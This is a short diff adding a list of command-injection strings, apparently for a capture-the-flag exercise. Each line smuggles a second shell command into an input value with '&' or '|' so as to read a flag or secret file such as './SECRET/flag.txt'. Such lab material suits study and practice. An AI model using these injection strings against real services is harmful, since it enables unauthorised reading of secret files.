@@ -1,0 +1,7 @@
+127.0.0.1 & cat flag.txt
+echo safe & cat ./SECRET/flag.txt
+"CIAO" & cat ./SECRET/flag.txt
+
+
+
+echo safe | cat ./SECRET/flag.txt
